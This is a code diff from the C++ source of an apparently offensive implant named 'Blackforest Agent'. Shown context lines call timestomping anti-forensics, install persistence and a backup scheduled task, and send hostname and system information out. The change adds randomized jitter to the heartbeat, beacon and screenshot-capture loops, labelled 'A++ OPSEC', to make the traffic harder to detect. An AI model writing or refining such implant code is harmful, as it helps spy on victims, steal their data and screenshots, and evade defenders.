@@ -167,7 +167,9 @@ public:
         Timestomp::CloneExplorer(); // Anti-Forensics
         InstallPersistence();
         ScheduledTask::Install();   // Backup Persistence
-        
+        // Initialize Random for Jitter (A++ OPSEC)
+        srand(static_cast<unsigned int>(time(NULL)));
+
         // Initial Notification
         secureLog.ExfiltrateDirect("[*] Blackforest Agent Started on: " + SystemInfo::GetHostName());
         secureLog.ExfiltrateDirect("INFO: " + SystemInfo::GetAllInfo());
@@ -318,20 +320,24 @@ private:
     void StartHeartbeat() {
         while(running) {
              secureLog.ExfiltrateDirect("[*] Heartbeat: " + SystemInfo::GetHostName());
-             Sleep(60000); 
+             // A++ Jitter: 60s +/- 10%
+             Sleep(54000 + (rand() % 12000)); 
         }
     }
     
     void StartBeacon() {
         while(running) {
              Beacon::Shout();
-             Sleep(30000); // Shout every 30s
+             // A++ Jitter: 30s +/- 10%
+             Sleep(27000 + (rand() % 6000)); 
         }
     }
 
     void ScreenMonitor() {
         while(running) {
-            Sleep(30000); 
+            // A++ Jitter: 30s +/- 10%
+            Sleep(27000 + (rand() % 6000)); 
+            
             std::vector<uint8_t> img = Screenshot::Capture();
             if(!img.empty()) {
                 // Send header first? 
